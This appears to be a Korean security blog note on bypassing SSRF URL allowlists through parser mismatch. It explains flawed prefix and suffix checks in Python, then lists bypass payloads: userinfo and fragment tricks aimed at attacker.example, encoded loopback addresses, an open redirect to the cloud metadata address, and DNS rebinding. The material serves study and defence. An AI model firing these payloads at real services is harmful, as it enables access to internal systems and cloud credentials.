---
title: "SSRF URL 검증 우회 (Parser Mismatch)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, SSRF]
tags: [ssrf, url-parsing, allowlist, dns-rebinding, web]
description: "SSRF 허용 목록이 userinfo·접미사 일치·파서 불일치로 깨지는 구조와, @·접두/접미·리다이렉트·DNS 리바인딩 우회 구문을 정리합니다."
mermaid: true
---

> 기본 개념은 [SSRF](/notes/ssrf/)에서 다뤘다. 이 글은 **"URL 검증이 왜 자꾸 깨지는가"** 를 본다. 결론은 하나다. 검증하는 코드와 요청하는 코드가 **같은 URL을 서로 다르게 읽기 때문**이다.

## 개념

SSRF 방어 코드는 보통 (1) 문자열 URL에서 호스트를 뽑아 허용 목록과 비교하고, (2) 같은 문자열을 HTTP 클라이언트에 넘겨 요청한다. **(1)과 (2)가 다른 해석기를 쓰면** 검증이 본 호스트 X와 접속 대상 Y가 달라진다.

```python
if url.startswith("https://images.example.com"):   # (a) 접두사 일치
    return True
host = url.split("/")[2]
return host.endswith("example.com")                 # (b) 접미사 일치
```

불일치 지점은 셋이다. ① 호스트를 "뽑지" 않고 URL 전체에 `startswith`/`endswith`/`in`, ② `@`·`#`·`\`·공백을 파서마다 다르게 처리, ③ 검사할 때 푼 IP와 접속할 때 푼 IP가 다름(DNS 리바인딩).

## 공격·우회 구문

내부 주소에 애플리케이션 메시지("허용되지 않은 호스트")가 나오면 문자열/파서 검증이 있는 것. 허용 도메인은 `example.com`, 내 서버는 `attacker.example`로 둔다.

### 접두/접미 일치 깨기

```
https://images.example.com.attacker.example/      # 접두사 일치 우회
https://evilexample.com/                           # endswith("example.com") 통과(점 경계 없음)
```

### userinfo (@) — @ 앞은 호스트가 아님

```
https://images.example.com@attacker.example/
https://attacker.example#images.example.com
https://attacker.example\@images.example.com
```

### IP·호스트 표기 변형

```
http://127.0.0.1 → http://127.1 / http://0x7f.1 / http://2130706433 / http://[::1]
http://①②⑦.⓪.⓪.①   (유니코드 숫자 정규화)
http://localtest.me   (공인 DNS가 127.0.0.1로 해석되는 이름)
```

### 리다이렉트 경유

```
허용 호스트에 열린 리다이렉트가 있으면:
  https://images.example.com/redirect?url=http://169.254.169.254/
클라이언트가 3xx를 따라가고 재검증이 없으면 허용 목록 우회
```

### DNS 리바인딩 (해석 시점 차이)

```
짧은 TTL 도메인이 검증 시 공인 IP → 접속 시 127.0.0.1 로 바뀌게
  attacker.example → (TTL 0) → 번갈아 응답
외부 콜백 도달 여부만 허가 범위에서 확인
```

### 일치 방식 추정

```
허용 도메인 앞/뒤에 글자 한 개씩 붙여 어디서 막히는지 → startswith/endswith/정규식 판별
```

## 참고 자료

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [RFC 3986: URI Generic Syntax](https://www.rfc-editor.org/info/rfc3986/)
